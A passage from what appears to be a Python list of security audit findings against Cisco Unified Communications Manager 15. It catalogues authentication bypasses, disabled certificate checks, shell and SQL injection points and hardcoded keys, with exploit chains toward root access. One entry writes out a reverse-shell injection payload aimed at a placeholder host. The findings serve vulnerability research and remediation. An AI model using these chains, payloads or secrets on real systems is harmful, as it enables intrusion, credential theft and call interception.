        ("CUCM-F6",  "MEDIUM",   "Nimbus JOSE+JWT 4.23 (2016) — alg:none bypass risk"),
        ("CUCM-F7",  "CRITICAL", "OpenSAML 2.6.5 XSW + SAMLAuthValve always-true bypass → admin access"),
        ("CUCM-F8",  "LOW",      "log4j 1.x (slf4j-log4j12-1.6.1) — JMSAppender CVE-2019-17571"),
        ("CUCM-F9",  "INFO",     "dbaxlweb DB username exposed; pw encrypted with static key"),
        ("CUCM-F10", "CRITICAL", "SAMLAuthValve returns TRUE regardless of Realm.authenticate() result"),
        ("CUCM-F11", "HIGH",     "SAFClientControl inter-cluster pw decryptable via static key fallback"),
        ("CUCM-F12", "HIGH",     "pktCap file param — .pktCap.passphrase download → decrypt all packet captures"),
        ("CUCM-F13", "MEDIUM",   "pktCap second-order SQLi via remoteUser in group membership check"),
        ("CUCM-F14", "LOW",      "pktCap key arg injection into pktCap_protectData (mode flip, no shell inj)"),
        ("CUCM-F15", "LOW",      "pktCap BASIC auth over cleartext HTTP (transport-guarantee=NONE)"),
        ("CUCM-F16", "HIGH",     "Phone cert CN validated via strstr (not strcmp) — registration spoofing via substring cert"),
        ("CUCM-F17", "HIGH",     "Platform API SOAP client trust-all X509TrustManager — inter-cluster cert/key MITM"),
        ("CUCM-F18", "MEDIUM",   "AXL SQL Toolkit trust-all TrustManager + JVM-global HostnameVerifier bypass → credential interception"),
        ("CUCM-F19", "HIGH",     "platform-services.war Axis2 admin:axis2 + hotdeployment=true; axis2-web/ exposed without auth"),
        ("CUCM-F20", "LOW",      "dbl2j.jar TimedPingPrimary.main() development JDBC credential shipped in production bytecode"),
        ("CUCM-F21", "HIGH",     "LDAP Manager bind password decryptable via F3 static AES key → AD/LDAP full enumeration"),
        ("CUCM-F22", "MEDIUM",   "IMS LDAP/LDAPS TLS hostname verification disabled (disableEndpointIdentification=true) → AD MITM"),
        ("CUCM-F23", "MEDIUM",   "CiscoRA EST Proof of Possession disabled (est_pop off) — phone cert issued without key ownership proof"),
        ("CUCM-F24", "MEDIUM",   "CiscoRA EST NTLM relay to Windows CA — phone cert issuance via NTLM credential relay"),
        ("CUCM-F25", "LOW",      "Hardcoded dev hostname WIN-EJSG9DN4GS6 in production CiscoRA nginx.conf; lab CA cert ships with ISO"),
        ("CUCM-F26", "INFO",     "Developer GDB extension spy.py (IMDB=CCMDB, author 'Stephen') ships in production ISO"),
        ("CUCM-F27", "MEDIUM",   "SAML SP AuthnRequests unsigned by default (metadata_auth_request_signed=false) — forged IdP redirects"),
        ("CUCM-F28", "LOW",      "SAML SP metadata/assertion signing disabled (sp_md_signed=false) — SP metadata substitution surface"),
        ("CUCM-F29", "MEDIUM",   "CCMAsymmetricEncryption uses RSA/ECB/PKCS1PADDING (PKCS#1 v1.5, deprecated NIST SP 800-131A) — Bleichenbacher susceptibility"),
        ("CUCM-F30", "MEDIUM",   "CallManager RSA private key passphrase stored in plaintext at /usr/local/cm/.security/CallManager/keys/CallManager.passphrase"),
        ("CUCM-F31", "CRITICAL", "F3 static key decrypts Windows CA service account creds + FIPS SSM PIN from CACredentials.txt → ADCS compromise + lateral movement"),
        ("CUCM-F32", "CRITICAL", "F3 static key decrypts OAuth JWT signing + encryption keys in authzkeys DB table → forge tokens for any CUCM user"),
        ("CUCM-F33", "CRITICAL", "Hardcoded OpenAM am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 in FederationConfig.properties → decode SAML JKS passphrase → forge SAML for any user"),
        ("CUCM-F34", "HIGH",     "F3 static key decrypts full credential estate: ldapauthentication.ldappassword (AD bind), device.sshpassword (all phones), directorypluginconfig.ldappassword (DirSync), UDS LDAP + service profile passwords; confirmed in 5 binaries"),
        ("CUCM-F35", "CRITICAL", "F1 RCE + F30 plaintext passphrase → CTLCli CTL file forge → phone estate trusts attacker cert → MitM all SRTP/TLS"),
        ("CUCM-F36", "LOW",      "Decrypted credential logging: SIPSecurity, SAF connection profile, HttpNPConnection all log plaintext passwords at trace level"),
        ("CUCM-F37", "HIGH",     "Pre-auth SQLi in ccmivr ccmusername via prepareStatement-with-concatenated-string (no ? placeholders); validator allows single-quote; GET/POST unprotected; ccmivr exempt from HTTPS redirect (HTTP-accessible); amplified by F3"),
        ("CUCM-F38", "MEDIUM",  "HAProxy admin socket /var/run/haproxy.sock mode 666 level admin — any local user reads sessions, disables rate limits, drains backends"),
        ("CUCM-F39", "HIGH",    "SRST CTL client EasyX509TrustManager: checkServerTrusted() no-op — CTLSocket.tlsConnect() accepts any server cert; MitM → inject CTL → branch phones trust attacker CA → full phone estate MitM"),
        ("CUCM-F40", "LOW",     "CiscoSoapClientTestTrustManager (named Test) shipped in production UXLService.war; sets JVM-wide axis.socketSecureFactory=SunFakeTrustSocketFactory; checkClientTrusted() no-op"),
        ("CUCM-F41", "CRITICAL","CMAS Redis bind=0.0.0.0 protected-mode=no no requirepass; pub/sub broker for CDRs+syslogs+filebeat; CONFIG SET file-write → SSH key injection or cron RCE"),
        ("CUCM-F42", "MEDIUM",  "BPS JVM -Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true globally disables LDAPS hostname verification; ImportLDAPAuth bulk import MitM-able; extends F22"),
        ("CUCM-F43", "HIGH",    "cm-security ships Cisco EVVBU code-signing private key: maKey.pvk (PVK magic 0xb0b5f11e, AT_SIGNATURE, encrypted); cert CN=Cisco Systems Inc. OU=EVVBU; Thawte Code Signing CA; crack PVK → sign binaries as Cisco"),
        ("CUCM-F44", "CRITICAL","WebDialer webdialer.war /services/* (WebdialerSoapService, WD70) has NO <security-constraint>; server-config.wsdd adminPassword=admin; enableRemoteAdmin=false limits hotdeploy to localhost; unauthenticated SOAP call initiation"),
        ("CUCM-F45", "CRITICAL","Extension Mobility emservice.war security-constraint enumerates PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE but omits GET/POST; Servlet spec: unlisted methods unconstrained; no <login-config>; /EMServiceServlet unauthenticated GET+POST → phone hijack"),
        ("CUCM-F46", "MEDIUM",  "dnaliaslookup.war security-constraint has user-data-constraint NONE but NO auth-constraint; CLIENT-CERT login-config never enforced; UserLookupServlet + AddToCache + ClearCache unauthenticated; extension enum + cache poison + DN alias DoS"),
        ("CUCM-F47", "MEDIUM",  "dna.war DNAMainServlet at /DNAMainServlet has no <security-constraint>; TokenFilter class (com.cisco.ccm.dna.servlets.TokenFilter) missing from WAR; alias persistence layer writable without auth; chain: F47 poison store + F46 ClearCache = persistent alias redirect"),
        ("CUCM-F48", "HIGH",    "ma.war (IPMA) security-constraint lists PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE deny-all but omits GET/POST; CSCsx40175 Cisco internal bug ref; /servlet/MAService + setAsstDivertTarget.jsp + setMgrDivertTarget.jsp unauthenticated GET+POST → call divert any manager/assistant pair"),
        ("CUCM-F49", "HIGH",    "pms.war Phone Migration Service: Jersey REST at /* has NO auth-constraint; transport-guarantee=NONE (comment says HTTPS redirect, misconfigured); FindPhoneByDN unauthenticated; PhoneMigration PIN oracle (3 distinct error msgs); brute PIN → hijack any user phone profile; chain: F3 static key → dump SSIDs+PINs from DB → direct hijack"),
        ("CUCM-F50", "HIGH",    "changecredential.war NO security-constraint (Servlet 2.2 DTD); /ChangeCredentialServlet exposes userid+oldpin params; PIN oracle: DIRUSER_ERROR=unknown user, INVALID_CREDENTIAL=valid user, USER_LOCKED=exhausted; PIN change propagates to Unity Connection via UpdateUnityUsersPinUtil; chain: F3 decrypt EndUser.pin offline → bypass oracle"),
        ("CUCM-F51", "HIGH",    "cucm-uds.war UDS REST API (Jersey): auth-constraint covers only /user/* and /private/user/*; unauthenticated: /emLoggedInUsers (EM session state — who is on which phone NOW), /users (directory enumeration), /clusterUser, /servers (cluster topology), /groups (RBAC), /private/emLoggedInUsers, /private/users, /private/clusterUser, /private/servers; /docs/* DefaultServlet listings=true; ccmcip /ControlledDevices.jsp + /xmldirectory.jsp unconstrained; chain: F51 emLoggedInUsers → F48 IPMA call divert; F51 users → F49/F50 PIN oracle"),
        ("CUCM-F52", "HIGH",    "platform-sso ships Tomcat 6.0.30 (built Aug 2011, EOL Dec 2016) as SSO auth tier Tomcat; 50+ CVEs in 6.0.30→EOL window including CVE-2012-3546 auth bypass (client cert + NIO); PAM sso-auth uses pam_permit.so (auth always succeeds) → local auth fully delegated to SAML; SSO Tomcat compromise = full platform auth bypass"),
        ("CUCM-F53", "MEDIUM",  "platform-ui sshRestrict.sh: chmod 666 /etc/ssh/sshd_config + /etc/security/limits.conf with NO permission restoration; world-writable persists permanently after any 'set session maxlimit' CLI command; sshd restart triggered by same command activates any injected config; chain: F41 Redis → write AuthorizedKeysFile → wait for next admin sshRestrict run → root SSH"),
        ("CUCM-F54", "MEDIUM",  "ccmact.war (ucm-ccmact): explicit web.xml comment 'no auth-constraint means everybody has access' on /v1/tester/* (Tester5XX — forces 5xx errors), /v1/testalarm/* (TestAlarm — fires real CUCM alarm events unauthenticated → alarm flood/evasion), /v1/actions/srp/* (SRPHandshakeResource — Activation Code Onboarding SRP, custom crypto: CryptoUtils/DefaultSRPCrypto/KDF/SRPMath), /v1/ping; auth-constrained: /v1/activationcode + /v1/release only"),
        ("CUCM-F55", "MEDIUM",  "cm-tvs bundleITLRecovery.sh: echo 'S_PWD is $S_PWD' line 47 (debug line) emits decrypted SftpPwCrypt SFTP backup password to stdout on Publisher during ITL Recovery bundle creation; openssl pkcs12 -password pass:$S_PWD also exposes passphrase in ps aux; ITLRecovery.p12 at /usr/local/cm/tftp/ chmod 664 group=ccmbase → readable by any ccmbase member; PKCS12 passphrase = SFTP password; ITL Recovery private key extraction → phone estate MitM (same impact as F35)"),
        ("CUCM-F56", "HIGH",    "Default Credential Policy (cm-dbl CredentialPolicy.csv pkid=9454babf): minlength=1 (1-digit PIN allowed), trivialcredchecking=0 (no check), maxdays=0 (never expires), prevcredcount=0 (no history); maxhacks=5/hackresettime=30min → 15 brute-force attempts/hour against 9-value PIN space; chains with F50 (changecredential.war DIRUSER_ERROR/INVALID_CREDENTIAL oracle) and F49 (pms.war oracle) for reliable PIN takeover"),
        ("CUCM-F57", "MEDIUM",  "sso-sp FederationConfig.properties: am.encryption.pwd=8p3BTg2tvtG0Kg//Hqahy8x29u9FPxH2 — hardcoded OpenAM Fedlet default symmetric encryption key; never rotated in CUCM 15.0.1; used by JCEEncryption to protect SAML keystore passphrases in fedlet.cot; same key across ALL CUCM 15 deployments; chains with F52 (Tomcat 6.0.30 RCE → filesystem read) to decrypt tomcat.keystore passphrase"),
        ("CUCM-F58", "HIGH",    "sso-sp ssoconfig.properties: metadata_auth_request_signed=false (SP-initiated AuthN requests unsigned), metadata_assertion_signed=false (SP does not require signed IdP assertions), sp_md_signed=false; OpenSAML 2.6.5 (EOL 2016) + xmlsec 1.5.6 (CVE-2013-2172); misconfigured IdP sends unsigned assertion → SAML auth bypass → CCMAdmin/AXL/UDS access"),
        ("CUCM-F59", "MEDIUM",  "ssosp.war (sso-sp): /token/access_token + /oauth/authorize + /user/whoami + /token/device have NO container security-constraint (Servlet 2.4 web.xml); 60+ OAuth client IDs hardcoded in ClientInfo.xml in the RPM (public); all clients use responsetype=token (implicit grant, deprecated per RFC 9700); refresh tokens valid 60 days; stolen token + known client_id → impersonate Jabber/phone OAuth client"),
        ("CUCM-F60", "MEDIUM",  "CCMEncryption.jar (cm-encryption): setStaticKey() is public static — sets useDynamicKey=false, disables dynamic key at runtime, forces fallback to AES-128 static key smetsysocsiccni\\x00 (16B); callable via reflection post-RCE (F1/F35/F41); <clinit> hardcodes useDynamicKey=true but effective key depends on dkey_status.txt=enable AND dkey.txt (64-char hex, 32B AES-256); wire format: IV(16,random)||AES-128-CBC-PKCS5(ciphertext); dkey.txt path predictable (/usr/local/platform/.security/CCMEncryption/keys/); if writable (F41 Redis/F53 sshd_config), plant known key to decrypt all future credentials"),
        ("CUCM-F61", "HIGH",    "cm-jar-lib ships Apache Struts 2.5.33 (struts2-core-2.5.33.jar, built Dec 5 2023); CVE-2024-53677 published Dec 9 2023 — CUCM ISO ships unpatched (2.5.34 fixes it); CVE-2024-53677 CVSS 9.8: file upload path traversal → write JSP shell outside webroot → RCE as tomcat; ccmadmin.war + ccmservice.war use Struts with certificate/firmware upload actions; chain: F3/F55 credential theft → admin auth → Struts file upload → JSP shell → tomcat RCE"),
        ("CUCM-F62", "MEDIUM",  "snmp-mon ships SNMP agent with: snmpd.cnf community=ccmadmincommunity (well-known CUCM default, SNMPv1 noAuthNoPriv); mgr.cnf USM root user auth=MD5 authpass=\\\"authpass\\\" priv=DES privpass=\\\"privpass\\\" literal defaults; USM public user noAuth/noPriv (unauthenticated read); SNMP MIB exposes phone registration state, extension list, cluster topology, performance counters; write access via root USM → modify trap destinations → alert evasion"),
        ("CUCM-F63", "CRITICAL","cm-syslog + cm-tct-svc DRF backup/restore scripts: do_backup.py/do_restore.py/do_syslog_restore.py/tct_do_backup.py/tct_do_restore.py all concatenate sys.argv values directly into os.system() shell commands; restore scripts execute \\\"DEVICE_TARBALL + DEC_SEQ | sudo /bin/tar -xvpPf - 1>> LOGFILE\\\" — three user-controlled injection points (DEVICE_TARBALL, DEC_SEQ, LOGFILE) with sudo; inject shell metacharacters in DRF backup config (SFTP path, encryption sequence, log path) → root RCE; LOGFILE→/etc/cron.d/backdoor = root persistence; chain: admin auth (F1/F7) → DRF backup config → sudo root shell"),
        ("CUCM-F64", "MEDIUM",  "cm-axl axl.war web.xml: <transport-guarantee>NONE</transport-guarantee> on /axl and /services/AXLAPIService — servlet container does not enforce HTTPS; AXL SOAP uses HTTP Basic Auth (base64 in Authorization header); admin credentials + full provisioning payload (users, phones, dial plans) traverse network in cleartext HTTP; network interception of any AXL session yields admin creds; chains with F37 (ccmivr SQLi), F61 (Struts RCE), F63 (DRF injection)"),
        ("CUCM-F65", "LOW",     "cm-perfupdcounter JPIWriterServiceImpl: LocateRegistry.createRegistry(9234) on 0.0.0.0 (all interfaces); no auth; no TLS; exposed interface: jstatsClearAll(containerID) clears all RTMT perf counters, jstatsUpdate*/jstatsInit inject false values; port 9234 RTMT-accessible; post-RCE cleanup step: clear perf trace before lateral movement; chain: F41/F35 post-compromise evasion"),
        ("CUCM-F66", "HIGH",    "platform-containers: AXL/UDS/SSOSP Docker containers all use network_mode=host (no port isolation from host); cap_add includes DAC_OVERRIDE + DAC_READ_SEARCH + SYS_PTRACE (bypasses POSIX permissions, can trace processes); volume mounts: /tmp:/tmp/ (RW shared), /opt/cisco:/opt/cisco/ (RW), /etc:/etc/:ro (SSH keys, LDAP creds, passwd visible), /usr:/usr/:ro, /var:/var/:ro; container compromise (F1/F61 RCE) -> host network stack -> Informix 9088 + Redis 6379 reachable localhost; /tmp staging for race-condition host privilege escalation; docker-compose-axl.yml + docker-compose-ssosp.yml + start_uds.sh all share this pattern"),
        ("CUCM-F67", "CRITICAL","cm-reporter DRF backup/restore scripts (reporter_do_backup.py + reporter_do_restore.py): same os.system()+sudo tar pattern as F63; DEVICE_TARBALL/ENC_SEQ/DEC_SEQ from sys.argv unsanitized; restore: DEVICE_TARBALL is first token in cmd string -> command prefix injection; separate RPM/component from F63 (cm-syslog/cm-tct-svc), two independent root RCE injection points in DRF framework; chains: F63 (same class), F3 (decrypt backup), F41 (Redis write-anywhere to stage payload)"),
        ("CUCM-F68", "HIGH",    "cm-soap-realtimeservice soapservicecontrol.sh: hardcoded AdminClient credentials -uxx (username=xx) -wxx (password=xx) passed to com.cisco.ccm.serviceability.soap.security.AdminClient; manages SOAP service deploy/undeploy/start/stop via https://localhost:PORT/CONTEXT/services/AdminService; affects all Axis SOAP services (realtimeservice/perfmonservice/logcollectionservice/controlcenterservice/SNMPService/dpservice); post-RCE (F35/F41) call this script to disable monitoring services before escalation (RTMT evasion)"),
        ("CUCM-F69", "HIGH",    "cm-reporter-servlet reporter-servlet.war Servlet 2.3 PATCH method bypass: security-constraint covers /* for GET (auth-required) and POST/PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE (deny); PATCH and all non-listed methods have NO auth-constraint; registered servlets: DeleteFiles/GetFileContent/GetFileList/GetFileListText; Tomcat HttpServlet.service() dispatches unknown methods to doGet() -> file read (GetFileContent) and file delete (DeleteFiles) accessible without auth; sessionFilter on /* is only remaining gate; probe: PATCH /ccmservice/reporter-servlet/GetFileContent?file=/var/log/active/..."),
        ("CUCM-F70", "HIGH",    "cm-soap-* WARs (realtimeservice/controlcenterservice/SNMPService/perfmonservice/logcollectionservice/dpservice): Axis 1.x AdminServlet at /servlet/AdminServlet mapped in all 6 WARs; Servlet 2.2 method enumeration leaves PATCH/PROPFIND/etc. unconstrained (GET/POST auth-required, PUT/DELETE/HEAD/CONNECT/OPTIONS/TRACE denied); PATCH to /servlet/AdminServlet with WSDD body -> service deployment without auth; server-config.wsdd in logcollectionservice.war + dpservice.war: adminPassword=admin hardcoded; enableRemoteAdmin=false limits /services/AdminService but not /servlet/AdminServlet HTTP handler"),
        ("CUCM-F71", "HIGH",    "cm-svc-web ftp.exp/sftp.exp: Tcl expect scripts use eval on caller-controlled argv; set cmd [lrange $argv 0 1]; set c [concat spawn $cmd]; eval $c -> arbitrary Tcl command injection when first two argv contain shell metacharacters or alternate spawn targets; any CUCM component invoking these scripts with attacker-controlled arguments is a transitive injection vector; runs at calling process privilege level"),
        ("CUCM-F72", "HIGH",    "cm-script cm_idp_post.sh subCopyfiles(): isftp writes SFTP file list to /tmp/list_cmd (no mktemp, predictable path); contents backtick-substituted into shell command: cmd=...`cat /tmp/list_cmd` then $cmd; TOCTOU race window between isftp write and cat; attacker pre-positions /tmp/list_cmd with shell metacharacters -> injection into sudo -u sftpuser context during W1/W2 upgrade phase; even without race: if /tmp writable before script starts, static injection via predictable path"),
        ("CUCM-F73", "MEDIUM",  "cm-ucmadmin ucmadmin.war PresenceViewerTrustManager: implements X509TrustManager with empty checkClientTrusted()/checkServerTrusted() bodies (no CertificateException thrown, no chain validation); anonymous HostnameVerifier returns true for any hostname; wired into SSLContext for outbound HTTPS to Presence servers; any network MITM between CUCM and Presence presents self-signed cert, intercepts all admin channel traffic; chains: F17 (same pattern platform-api), F39 (srstctlclient), F40 (UXLService)"),
        ("CUCM-F74", "HIGH",    "cm-ucmadmin ucmadmin.war bundles xalan-2.7.3.jar: CVE-2022-34169 (CVSS 7.5) integer truncation in XSLT bytecode generator allows arbitrary class load via attacker-supplied stylesheet; exploitability conditional on untrusted XSLT reaching TransformerFactory.newTransformer(Source); ucmadmin.war has 15+ @RequestBody POST endpoints with no CSRF gate (F75); chain F75->F74: CSRF-forced authenticated POST with XSLT payload -> authenticated RCE if transformer call site reachable"),
        ("CUCM-F75", "MEDIUM",  "cm-ucmadmin ucmadmin.war: Spring Security filter (springSecurityFilterChain) commented out in applicationContext-security.xml with note 'Cannot use due to need for Tomcat Shared Realm SSO'; consequence: zero CSRF token validation on 15+ @RequestBody POST endpoints (DirectoryNumber/EndUser/SIPTrunk/FeatureGroupTemplate/RouteList/SIPProfile/TranslationPattern/etc.); attacker with link clicked by authenticated admin executes provisioning changes against live CUCM config; transport-guarantee=NONE enables HTTP downgrade to steal auth cookie before CSRF"),
        ("CUCM-F76", "MEDIUM",  "cm-svc-web ccmservice.war Servlet 3.0: DbSyncServlet (url=/DbSyncServlet.class) and LogoffServlet not in any <security-constraint>; struts2 /* filter intercepts but only dispatches to Struts action if mapping exists for .class extension; no container-level auth enforcement; DbSyncServlet likely triggers CUCM-to-database sync (destructive/sensitive); exploitability depends on Struts action config at runtime"),
        ("CUCM-F77", "MEDIUM",  "cm-sch SCHHostnameVerifier.verify(): iconst_1;ireturn (unconditional true) -- any hostname accepted; TLSSocketFactory enables SSLv2Hello+SSLv3 (POODLE downgrade CVE-2014-3566); SCHTrustManager.checkServerTrusted() DOES validate chain (rethrows exception, not fully bypassed); affected: TAC phone-home, AMC amc.cisco.com, GRTSourceBase :8443/grt/, TraceDownloadUtil SFTP creds XML POST body; same systemic class as F17/F39/F40/F73"),
        ("CUCM-F78", "HIGH",    "cm-gaxl gaxl.war security-constraint <url-pattern>/</url-pattern> (default servlet pattern, root only) -- NOT /*; CXFServlet at /soap/* exposes AXL SOAP v8.0-15.0 without container auth enforcement; only HideResourceFilter (custom) covers /*; bypass vectors: path normalization (//soap/, %2fsoap), RequestDispatcher.forward() bypasses REQUEST-type filter, direct access to internal Tomcat HTTP port 9446 (F66 Docker host network); transport-guarantee=NONE permits cleartext Basic Auth; chain: F66->localhost:9446->unauthenticated AXL SOAP provisioning API"),
        ("CUCM-F79", "HIGH",    "cm-dirsync CCMDirSyncCfg.xml JVM arg -Dcom.sun.jndi.ldap.object.disableEndpointIdentification=true: disables LDAP SSL endpoint identification (hostname verification) globally for directory synchronization JVM; any network MITM can present rogue LDAP server with any cert CN -> intercept/modify all LDAP sync traffic; impact: rogue user injection into CUCM directory, steal LDAP bind password via LDAP referral, replay CUCM-enrolled device data; chain: F21 (LDAP bind pwd via F3), F22 (LDAPS hostname bypass in IMS) -- same systemic class, separate JVM process"),
        ("CUCM-F80", "CRITICAL","cm-tftp HAProxy stats socket /var/run/haproxy.sock mode 666 level admin: world-writable socket with admin-level access; any local process sends HAProxy admin commands (disable/enable backends, redirect routes) without authentication; disable phone provisioning backends -> failover to attacker TFTP server; redirect phone HTTPS config fetch to rogue server; chain: F38 (same socket, different impact analysis - F80 focuses on phone provisioning redirect), F66 (Docker /tmp RW mount -> symlink to haproxy.sock)"),
        ("CUCM-F81", "CRITICAL","cm-capf EnrollmentService.sh: RA_AUTH_PLUGIN=no-op when CAPFCertGenMethod=4 + OnlineCAType=2 (EST); CAPF RA authentication plugin set to no-op disables all authentication for EST certificate enrollment; any device submitting a CSR receives a CAPF-signed phone identity certificate -> phone impersonation; chain: F23 (EST PoP disabled - different enforcement layer), F85 (est_pop off in nginx.conf)"),
        ("CUCM-F82", "HIGH",    "cm-capf nginx_update.sh: echo $4 > CACredentials.txt + echo $5 >> CACredentials.txt where $4=NTLMUser $5=NTLMPassword; NTLM credentials written by echo = visible in /proc/PID/cmdline + syslog during shell execution; file persists at /usr/local/cm/conf/nginx/CACredentials.txt at predictable path; chain: F31 (F3 static key decrypts CACredentials.txt contents), F55 (similar plaintext SFTP passphrase echo pattern)"),
        ("CUCM-F83", "HIGH",    "cm-security maKey.pvk (PVK magic 0xb0b5f11e RSA AT_SIGNATURE private key) + maNScert.pfx (PKCS#12) shipped in RPM installer -- POSSIBLE OVERLAP WITH F43 (EVVBU code-signing key); verify if same files: F43 says maKey.pvk in cm-security, F83 adds maNScert.pfx context; used for CTL file signing and code signing; chain: F35 (CTL forge -> phone MitM), F43 (code-signing key)"),
        ("CUCM-F84", "HIGH",    "cm-tftp HAProxy bind 0.0.0.0:6971/6972 verify optional: TFTP HTTPS phone config ports accept unauthenticated TLS clients (no client cert required); SEP<MAC>.cnf.xml phone config files (SIP/SCCP server list, dial plans, CAPF enrollment params, firmware URLs) served without client certificate validation; any network client can enumerate MAC addresses and pull full phone configurations; chain: F80 (HAProxy control), F81 (CAPF enrollment params in config)"),
        ("CUCM-F85", "HIGH",    "cm-capf nginx.conf est_pop off: EST Proof of Possession disabled (POSSIBLE OVERLAP WITH F23 which documents est_pop off from CiscoRA/EST analysis); RFC 7030 PoP ensures CSR key binding; without it MitM can substitute arbitrary public key in CSR -> attacker key bound to victim phone identity cert; confirm if F23 and F85 are same nginx.conf directive or different config layers"),
        ("CUCM-F86", "HIGH",    "cm-capf nginx_update.sh: sudo sed -i -e 's/.../\\1 \"$template\";/' nginx.conf where $template is script parameter; shell variable expansion unsanitized in sed regex replacement; malicious $template (containing / or other sed metacharacters) corrupts nginx.conf -> forces EST into proxy/no-auth mode; escalates to nginx config RCE if $certificate_enrollment_profile_label similarly injected; chain: F81 (RA_AUTH_PLUGIN no-op when auth disabled by corrupt config)"),
        ("CUCM-F87", "CRITICAL","cm-ccmportal ccmportal.war Servlet 3.0: <http-method-omission>GET</http-method-omission> + <http-method-omission>POST</http-method-omission> in security-constraint; http-method-omission = constraint applies to methods NOT listed; meaning the auth-constraint covers only non-GET/non-POST methods, NOT GET/POST; all real browser traffic (GET pages, POST form submissions) is UNCONSTRAINED at container level; CCM Admin portal fully accessible to GET/POST without auth; one of most severe Servlet 3.0 http-method-omission misconfigurations"),
        ("CUCM-F88", "HIGH",    "cm-ccmuser ccmuser.war: zero <security-constraint> elements in web.xml; CCMRealm commented out as 'Temporary' in context.xml; CCM User Self-Service Portal (PIN/password reset, speed dials, voicemail config) relies solely on a single custom Tomcat Valve with no realm-backed authentication; any Valve bypass (SSRF from localhost, timing, error-path) = unauthenticated access to all self-service functions; chain: F50 (changecredential.war same missing auth pattern)"),
        ("CUCM-F89", "HIGH",    "cm-ucmuser ucmuser.war ships <!-- Development web.xml --> comment as ACTIVE PRODUCTION DESCRIPTOR; comment says 'devWeb.xml allows access to entry resources without authentication'; security-constraints have transport-guarantee=NONE on all paths; no role-based enforcement visible; UCM User Portal (unified communications self-service) accessible without HTTPS; chain: F90 (dojo/* unauthenticated)"),
        ("CUCM-F90", "MEDIUM",  "cm-ucmuser ucmuser.war /dojo/* no auth-constraint: Dojo JS framework endpoint serves full application JS including AllDeviceServices.js / DeviceSpeedDials.js / ApplyToAllDevicesSpeedDials.js which expose UDS REST API endpoint patterns; pre-auth information disclosure of all API routes, parameter names, and service structure; chain: F51 (cucm-uds.war UDS REST API auth gaps)"),
        ("CUCM-F91", "LOW",     "cm-lbm lbmTmpScript.sh: idblj -e \"select ... where name='$hostname'\" -- $hostname from system config (xmlfoo platformConfig.xml) injected unsanitized into Informix SQL; conditional exploitability: requires DHCP/provisioning hostname injection or ability to write platformConfig.xml; on success: SQL context escape in Informix idblj session; chain: F4 (Informix credentials), F13 (ccmivr SQL injection pattern)"),
        ("CUCM-F92", "CRITICAL","generic-util GenericUtils.jar NoOpTrustManager + CustomAxisSocketFactory: SYSTEMIC ROOT CAUSE of all no-op TrustManager findings; NoOpTrustManager: checkClientTrusted()/checkServerTrusted() both empty (no CertificateException possible); getAcceptedIssuers() returns null; CustomAxisSocketFactory.getContext() initializes SSLContext with new NoOpTrustManager[] -> ALL Axis SOAP calls through this factory accept any cert; inter-component CUCM SOAP (AXL/service-to-service) fully MITM-able; chains: F17/F39/F40/F73/F77 (symptom-level findings), F92 = root cause library"),
        ("CUCM-F93", "HIGH",    "cm-soap2-logcollectionservice2 logcollectionservice2.war Axis2 1.4 (axis2-kernel-1.4.jar): hardcoded default admin:axis2 in WEB-INF/conf/axis2.xml (same as F1 for axl.war but separate WAR); AdminService.aar deployed with default creds -> unauthenticated arbitrary .aar deployment = RCE; no WS-Security module loaded (only addressing + soapmonitor); Axis2 1.4 CVE-2010-2103 admin bypass + SSRF; GetOneFile service: whitelist bypass potential if selectLogFiles called to manipulate fileMap with short entries (substring contains() check on canonical path)"),
        ("CUCM-F94", "CRITICAL","cm-bps BAT DRF bat_do_backup.py / bat_do_restore.py: third independent DRF os.system() + sudo tar injection class (F63/F67/F94 = systemic DRF framework defect); DEVICE_TARBALL/LOGPATH/ENC_SEQ (backup) and DEVICE/DEC_SEQ/LOGPATH (restore) all from sys.argv directly concatenated into os.system shell commands; restore: command = DEVICE + DEC_SEQ + ' | sudo /bin/tar ...' -- DEVICE is first token = command-prefix injection (';bash -i &>/dev/tcp/x/443 <&1 # '); all three injection points reach root via sudo; chain: F63 (cm-syslog DRF), F67 (cm-reporter DRF) -- same class"),
        ("CUCM-F95", "MEDIUM",  "pms.war (Property Management System integration) Jersey JAX-RS REST API FindPhoneByDN + PhoneMigration (@GET) no <auth-constraint> in <security-constraint>; only <transport-guarantee>NONE</transport-guarantee> present; container-level auth not enforced; FindPhoneByDN: phone MAC-to-DN mapping enumerable without auth; PhoneMigration: exposes migration/upgrade state; chain: F84 (TFTP phone config enumeration -> phone MACs) -> F95 (FindPhoneByDN -> MAC-to-extension map)"),
        ("CUCM-F96", "MEDIUM",  "cm-CtlCli ctl_cli.sh copy_ctlFile() TOCTOU: /tmp/ctl_batch and /tmp/delete_ctl_batch created via cat >> (no O_EXCL) at predictable world-writable paths; race window between cat-create and sftp_connect.sh -b /tmp/ctl_batch sftpuser@$node execution; attacker with local shell pre-plants malicious SFTP batch commands -> sftpuser executes injected SFTP commands on ALL cluster peer nodes during any CTL file operation (mode change, certificate rotation, CTL reset); sftpuser has cluster-wide SFTP access by design; class: CWE-377 (same as F72 cm_idp_post.sh /tmp/list_cmd); chain: F72 (TOCTOU class), F35 (CTL file controls cluster security mode)"),
        ("CUCM-F97", "HIGH",    "cm-RIS mmfSpyScript.sh: OUTPUT=`/usr/local/cm/bin/mmfSpy ${PARAMS[*]}` -- ${PARAMS[*]} unquoted array expansion in backtick command; word-split on whitespace causes shell metacharacters in CLI args (backtick, $(), ;, |, &) to break out of argument context and execute as shell commands in mmfSpyScript.sh process context; attack vector: authenticated CLI user runs 'show risdb <injected>' with metachar payload; privilege level = dispatch context of mmfSpyScript.sh (platform CLI broker typically root or privileged service account); class: CWE-78 (same as F63/F67/F94 DRF injection family, different component); remediation: quote array as \"${PARAMS[@]}\" and validate against allowlist"),
